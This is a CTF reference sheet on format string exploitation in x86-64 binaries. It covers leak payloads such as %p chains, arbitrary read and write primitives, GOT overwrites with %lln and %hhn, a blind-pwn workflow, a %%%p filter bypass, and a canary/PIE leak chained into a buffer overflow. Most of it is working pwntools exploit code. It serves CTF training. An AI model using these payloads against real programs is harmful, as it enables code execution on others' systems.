# CTF Pwn - Format String Exploitation

## Format String Basics

- Leak stack: `%p.%p.%p.%p.%p.%p`
- Leak specific offset: `%7$p`
- Write value: `%n` (4-byte), `%hn` (2-byte), `%hhn` (1-byte), `%lln` (8-byte)
- GOT overwrite for code execution

**Write size specifiers (x86-64):**
| Specifier | Bytes Written | Use Case |
|-----------|---------------|----------|
| `%n` | 4 | 32-bit values |
| `%hn` | 2 | Split writes |
| `%hhn` | 1 | Precise byte writes |
| `%lln` | 8 | Full 64-bit address (clears upper bytes) |

**IMPORTANT:** On x86-64, GOT entries are 8 bytes. Using `%n` (4-byte) leaves upper bytes with old libc address garbage. Use `%lln` to write full 8 bytes and zero upper bits.

**Arbitrary read primitive:**
```python
def arb_read(addr):
    # %7$s reads string at address placed at offset 7
    payload = flat({0: b'%7$s#', 8: addr})
    io.sendline(payload)
    return io.recvuntil(b'#')[:-1]
```

**Arbitrary write primitive:**
```python
from pwntools import fmtstr_payload
payload = fmtstr_payload(offset, {target_addr: value})
```

**Manual GOT overwrite (x86-64):**
```python
# Format: %<value>c%<offset>$lln + padding + address
# Address at offset 8 when format is 16 bytes

win = 0x4011f6
target_got = 0x404018  # e.g., printf@GOT

fmt = f'%{win}c%8$lln'.encode()  # Write 'win' chars then store to offset 8
fmt = fmt.ljust(16, b'X')        # Pad to 16 bytes (2 qwords)
payload = fmt + p64(target_got)  # Address lands at offset 6 + 16/8 = 8

# Note: This prints ~4MB of spaces - be patient waiting for output
```

**Offset calculation for addresses:**
- Buffer typically starts at offset 6 (after register args)
- If format string is padded to N bytes, addresses start at offset: `6 + N/8`
- Example: 16-byte format → addresses at offset 8
- Example: 32-byte format → addresses at offset 10
- Example: 64-byte format → addresses at offset 14

**Verify offset with test payload:**
```python
# Put known address after N-byte format, check with %<calculated_offset>$p
test = b'%8$p___XXXXXXXXX'  # 16 bytes
payload = test + p64(0xDEADBEEF)
# Should print 0xdeadbeef if offset 8 is correct
```

**GOT target selection:**
- If `exit@GOT` doesn't work, try other GOT entries
- `printf@GOT`, `puts@GOT`, `putchar@GOT` are good alternatives
- Target functions called AFTER the format string vulnerability
- Check call order in disassembly to pick best target

**Stack layout discovery (find your input offset):**
```
%1$p %2$p %3$p ... %50$p
```
- Your input appears at some offset (commonly 6-8)
- Canary: looks like `0x...00` (null byte at end)
- Saved RBP: stack address pattern
- Return address: code address (PIE or libc)

## Blind Pwn (No Binary Provided)

When no binary is given, use format strings to discover everything:

**1. Confirm vulnerability:**
```
> %p-%p-%p-%p
0x563b6749100b-0x71-0xffffffff-0x7ffff9c37b80
```

**2. Discover protections by leaking stack:**
- Find canary (offset ~39, pattern `0x...00`)
- Find saved RBP (offset ~40, stack address)
- Find return address (offset ~41-43, code pointer)

**3. Identify PIE base:**
- Leak return address pointing into main/binary
- Subtract known offset to get base (may need guessing)

**4. Dump GOT to identify libc:**
```python
# Read GOT entries for known functions
puts_addr = arb_read(pie_base + got_puts_offset)
stack_chk_addr = arb_read(pie_base + got_stack_chk_offset)
```

**5. Cross-reference libc database:**
- https://libc.blukat.me/
- https://libc.rip/
- Input multiple function addresses to identify exact libc version

**6. Calculate libc base:**
```python
# From leaked __libc_start_main return or similar
libc.address = leaked_ret_addr - known_offset
```

**Common stack offsets (x86_64):**
| Offset | Typical Content |
|--------|-----------------|
| 6-8 | User input buffer |
| ~39 | Stack canary |
| ~40 | Saved RBP |
| ~41-43 | Return address |

## Format String with Filter Bypass

**Pattern (Cvexec):** `filter_string()` strips `%` but skippable with `%%%p`.

**Filter bypass:** If filter checks adjacent chars after `%`:
- `%p` → filtered
- `%%p` → properly escaped (prints literal `%p`)
- `%%%p` → third `%` survives, prints stack value

**GOT overwrite via format string (byte-by-byte with `%hhn`):**
```python
# Write last 3 bytes of debug() addr to strcmp@GOT across 3 payloads
# Pad address to consistent stack offset (e.g., 14th position)
for byte_offset in range(3):
    target = got_strcmp + byte_offset
    byte_val = (debug_addr >> (byte_offset * 8)) & 0xff
    # Calculate chars to print, accounting for previous output
    payload = f"%%%dc%%%d$hhn" % (byte_val - prev_written, 14)
    payload = payload.encode().ljust(48, b'X') + p64(target)
```

## Format String Canary + PIE Leak

**Pattern (My Little Pwny):** Format string vulnerability to leak canary and PIE base, then buffer overflow.

**Two-stage attack:**
```python
# Stage 1: Leak via format string
io.sendline(b'%39$p.%41$p')  # Canary at offset 39, return addr at 41
leak = io.recvline()
canary = int(leak.split(b'.')[0], 16)
pie_base = int(leak.split(b'.')[1], 16) - known_offset

# Stage 2: Buffer overflow with known canary
win = pie_base + win_offset
payload = b'A' * buf_size + p64(canary) + p64(0) + p64(win)
io.sendline(payload)
```
